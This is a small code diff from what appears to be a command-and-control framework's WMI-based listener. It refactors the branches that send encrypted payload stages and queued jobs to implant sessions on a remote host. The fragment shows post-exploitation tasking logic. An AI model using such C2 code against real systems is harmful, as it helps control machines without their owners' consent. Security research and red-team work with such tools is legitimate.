@@ -167,14 +167,17 @@ class STListener(Listener):
                             self.write(iWbemServices, records, payload=f"{GUID}:kex:server:{b64encode(pub_key.encode()).decode()}")
 
                         elif op == "stage":
-                            stage_file = self.dispatch_event(events.ENCRYPT_STAGE, (self["Comms"], GUID, self["Host"]))
-                            if stage_file:
+                            if stage_file := self.dispatch_event(
+                                events.ENCRYPT_STAGE,
+                                (self["Comms"], GUID, self["Host"]),
+                            ):
                                 self.dispatch_event(events.SESSION_STAGED, f'Sending stage ({sys.getsizeof(stage_file)} bytes) ->  {self["Host"]} ...')
                                 self.write(iWbemServices, records, payload=f"{GUID}:stage:server:{b64encode(stage_file)}")
 
                         elif op == "jobs":
-                            job = self.dispatch_event(events.SESSION_CHECKIN, (GUID, self["Host"]))
-                            if job:
+                            if job := self.dispatch_event(
+                                events.SESSION_CHECKIN, (GUID, self["Host"])
+                            ):
                                 self.write(iWbemServices, records, payload=f"{GUID}:jobs:server:{b64encode(job).decode()}")
 
                         elif op.startswith("job_results"):
